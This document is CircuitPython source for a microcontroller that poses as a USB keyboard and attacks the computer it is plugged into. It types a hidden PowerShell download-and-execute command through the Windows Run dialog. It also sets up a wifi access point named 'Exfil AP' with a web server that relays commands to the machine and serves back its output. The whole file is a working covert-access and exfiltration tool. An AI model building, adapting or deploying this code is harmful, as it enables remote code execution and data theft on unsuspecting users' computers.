import board
import busio
import usb_hid
import time
import usb_cdc
import supervisor
import asyncio
import usb_hid_map as usb
from adafruit_esp32spi import adafruit_esp32spi
from digitalio import DigitalInOut
from adafruit_hid.keyboard import Keyboard
import adafruit_esp32spi.adafruit_esp32spi_wifimanager as wifimanager
import adafruit_esp32spi.adafruit_esp32spi_wsgiserver as server

#Variables

class GlobalVariables:
    serial_data = b''
    old_cmd = b''
    cmd = b'ipconfig'

# Disable autoreload
supervisor.disable_autoreload()

# Setup Keyboard
kbd = Keyboard(usb_hid.devices)

#Setup Wifi
spi = busio.SPI(board.GP18, board.GP19, board.GP16)
esp32_cs = DigitalInOut(board.GP7)
esp32_ready = DigitalInOut(board.GP10)
esp32_reset = DigitalInOut(board.GP11)
SD_CS = board.GP22
esp = adafruit_esp32spi.ESP_SPIcontrol(spi, esp32_cs, esp32_ready, esp32_reset)

#Setup Access Point
secrets = {"ssid": "Exfil AP"}
wifi = wifimanager.ESPSPI_WiFiManager(esp, secrets)
wifi.create_ap()

#Setup Serial Port
serial = usb_cdc.data

#Server Web Page
def send_web_data(environ, start_response):
    if environ['PATH_INFO'] == '/':
        print(f'Serving Data: {variables.serial_data}')
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return variables.serial_data.decode('utf-8')
    elif environ['PATH_INFO'] == '/cmd':
        variables.old_cmd = variables.cmd
        variables.cmd = environ['QUERY_STRING'].split('=')[1].encode('utf-8')
        print(f'Got Command: {variables.cmd}')
        start_response('200 OK', ['Content-Type', 'text/plain'])
        return 'Command Submitted. Check for Updated Output'

#Setup Web Server
server.set_interface(esp)
this_server = server.WSGIServer(80, application=send_web_data)
this_server.start()

#Main Webserver Loop
async def serve_web_page():
    while True:
        try:
            this_server.update_poll()
        except ConnectionError:
            continue
        await asyncio.sleep(0.25)

async def get_serial_data(variables):
    while True:
        if serial.in_waiting > 0:
            variables.serial_data = b''
            while serial.in_waiting > 0:
                variables.serial_data += serial.read(serial.in_waiting)
            print(f'Read Data: {variables.serial_data}')
        await asyncio.sleep(0.25)
        
async def send_serial_data(variables):
    while True:
        if variables.cmd != variables.old_cmd:
            variables.old_cmd = variables.cmd
            serial.write(variables.cmd)
            print(f'Sent Data: {variables.cmd}')
        await asyncio.sleep(0.25)
        
async def main(variables):
    task_serve_web_page = asyncio.create_task(serve_web_page())
    task_get_serial_data = asyncio.create_task(get_serial_data(variables))
    task_send_serial_data = asyncio.create_task(send_serial_data(variables))
    
    await asyncio.gather(task_serve_web_page, task_get_serial_data, task_send_serial_data)

# Payloads
# Windows Key + R
payload1 = [usb.RUN]
payload2 = usb.get_sequence('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString(\'http://example.org/powershell-to-host.txt\')"')
payload2 += [usb.ENTER]

def send(this_input, sleep=0.25):
    for item in this_input:
        if type(item) is list:
            kbd.send(*item)
        else:
            kbd.send(item)
    time.sleep(sleep)

time.sleep(2)
send([usb.CLOSE])
send(payload1)
send(payload2, 1)

variables = GlobalVariables()
asyncio.run(main(variables))
